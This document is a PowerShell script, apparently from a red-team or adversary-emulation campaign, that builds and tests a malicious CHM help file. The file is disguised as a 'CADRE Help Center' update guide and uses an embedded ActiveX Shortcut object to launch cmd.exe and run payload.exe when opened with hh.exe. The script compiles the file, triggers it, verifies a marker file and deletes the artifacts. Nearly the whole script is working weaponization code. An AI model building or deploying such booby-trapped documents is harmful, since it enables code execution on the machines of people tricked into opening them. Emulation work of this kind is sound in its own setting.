# CADRE — WT065 — CHM Execution (REAL, 2026-08-03)
# Builds a .chm with an ActiveX Shortcut object (classid adb880a6-d8ff-11cf-9377-00aa003b7a11)
# that runs cmd.exe /c payload.exe from hh.exe; opens it and verifies the marker.
$ErrorActionPreference = 'Continue'
$www = 'C:\Tools\campaign-h\www'
$hhcExe = "$www\hhw\hhc.exe"   # extracted from the HHW installer via 7-Zip (no admin)

if (-not (Test-Path "$www\payload.exe")) { Write-Output 'PAYLOAD_MISSING'; exit 1 }

# fall back to an installed HHW
if (-not (Test-Path $hhcExe)) {
    $installed = Get-ChildItem 'C:\Program Files (x86)\HTML Help Workshop\hhc.exe','C:\Program Files\HTML Help Workshop\hhc.exe' -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($installed) { $hhcExe = $installed.FullName }
}
Write-Output "HHC_EXE $hhcExe"
if (-not (Test-Path $hhcExe)) { Write-Output 'HHW_MISSING'; exit 1 }

Write-Output '=== 1. Write HTML + HHC + HHP ==='
$htm = @'
<html><head><title>CADRE Help Center</title></head>
<body>
<h1>Update guide</h1>
<OBJECT id=sc type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",C:\Windows\System32\cmd.exe,/c C:\Windows\Temp\payload.exe">
</OBJECT>
</body></html>
'@
Set-Content -Path "$www\H-03-evil.htm" -Value $htm -Encoding ASCII

$hhc = @'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML><HEAD></HEAD><BODY>
<UL><LI><OBJECT type="text/sitemap"><param name="Name" value="Welcome"></OBJECT></LI></UL>
</BODY></HTML>
'@
Set-Content -Path "$www\H-03-evil.hhc" -Value $hhc -Encoding ASCII

$hhp = @'
[OPTIONS]
Compatibility=1.1 or later
Compiled file=H-03-evil.chm
Contents file=H-03-evil.hhc
Default topic=H-03-evil.htm
Title=CADRE Help Center

[FILES]
H-03-evil.htm
'@
Set-Content -Path "$www\H-03-evil.hhp" -Value $hhp -Encoding ASCII
Write-Output 'FILES_WRITTEN'

Write-Output '=== 2. Compile with hhc.exe ==='
Push-Location $www
& $hhcExe "H-03-evil.hhp" 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "HHC|$_" }
Pop-Location
Write-Output "CHM_EXISTS $(Test-Path "$www\H-03-evil.chm")"
if (Test-Path "$www\H-03-evil.chm") { Write-Output "CHM_SIZE $((Get-Item "$www\H-03-evil.chm").Length)" }

Write-Output '=== 3. Open CHM (hh.exe) ==='
# ensure payload is in C:\Windows\Temp (the Shortcut object targets it there)
Copy-Item "$www\payload.exe" 'C:\Windows\Temp\payload.exe' -Force
Remove-Item 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' -ErrorAction SilentlyContinue
Start-Process -FilePath 'C:\Windows\hh.exe' -ArgumentList "$www\H-03-evil.chm" -ErrorAction SilentlyContinue
Start-Sleep -Seconds 8
Write-Output "MARKER_HIT $(Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt')"
if (Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt') { Get-Content 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' }
Get-Process -Name hh -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Output '=== 4. Cleanup CHM artifacts ==='
Remove-Item "$www\H-03-evil.chm", "$www\H-03-evil.htm", "$www\H-03-evil.hhc", "$www\H-03-evil.hhp" -ErrorAction SilentlyContinue
Write-Output 'WT065_DONE'
